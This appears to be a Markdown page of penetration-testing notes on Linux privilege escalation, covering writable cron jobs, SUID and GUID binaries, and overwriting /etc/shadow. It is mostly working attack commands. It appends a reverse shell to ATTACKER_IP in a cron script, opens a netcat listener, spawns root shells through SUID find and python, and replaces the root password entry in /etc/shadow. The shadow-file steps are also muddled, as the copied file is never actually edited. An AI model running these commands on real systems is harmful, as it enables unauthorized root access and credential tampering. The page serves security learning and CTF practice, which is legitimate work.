### References

- [GTFOBins: SUID Exploits](https://gtfobins.github.io/)
- [Exploit-DB: Linux Privilege Escalation](https://www.exploit-db.com/papers/42280)

---

!!! tip "Tip"
    For SUID binaries, check GTFOBins first before writing custom exploits — most common binaries have documented privesc paths. For cron, check if the script is writable OR if any directory in its path is writable (path injection).

!!! warning "Watch out"
    SUID on custom binaries (not standard Linux utils) is a red flag — these are often intentional CTF vectors. In real engagements, SUID on non-standard binaries can indicate misconfiguration worth investigating.

## Exploiting Vulnerable Cron Jobs

Cron jobs run scheduled tasks and, if misconfigured, can allow privilege escalation.

### Identifying Misconfigured Cron Jobs

To check system cron jobs:

```bash
cat /etc/crontab
ls -lah /etc/cron.*
```

Check for writable cron job scripts:

```bash
find /etc/cron* -writable -type f 2>/dev/null
```

If a cron job script is writable by an unprivileged user and executed as root, it can be modified to run arbitrary commands.

### Exploiting Writable Cron Job Scripts

1. Confirm write access:
    
    ```bash
    ls -lah /home/joe/.scripts/user_backups.sh
    ```
    
2. Inject a reverse shell:
    
    ```bash
    echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /home/joe/.scripts/user_backups.sh
    ```
    
3. Start a Netcat listener:
    
    ```bash
    nc -lvnp 4444
    ```
    
4. Wait for the cron job to execute and provide a root shell.
    

---
## Exploiting SUID and GUID Binaries

SUID binaries execute with the owner's privileges, and GUID binaries execute with the group owner's privileges. If these binaries are misconfigured, they can be abused for privilege escalation.

### Identifying SUID and GUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null       # Find SUID binaries
find / -perm -u=s -o -perm -g=s 2>/dev/null  # Check SUID binaries
find / -writable -type d 2>/dev/null         # Find writable directories
```
### Exploiting SUID Binaries

If `find` has the SUID bit set:

```bash
find . -exec /bin/sh -p \; -quit
```

If `python` has the SUID bit set:

```bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

These commands escalate privileges by executing a new shell as root.

---

## Exploiting SUID via Overwriting Sensitive Files

If `cp` or `tar` has the SUID bit set, they can be used to overwrite system files:

1. Copy `/etc/shadow` to `/tmp`:
    
    ```bash
    cp /etc/shadow /tmp/shadow.bak
    ```
    
2. Modify `/etc/shadow` with a new root password:
    
    ```bash
    openssl passwd -1 -salt xyz P@ssw0rd
    ```
    
3. Replace `/etc/shadow` with the modified file:
    
    ```bash
    cp /tmp/shadow.bak /etc/shadow
    ```
    
4. Switch to root:
    
    ```bash
    su root
    ```
    

This method grants root access by modifying stored credentials.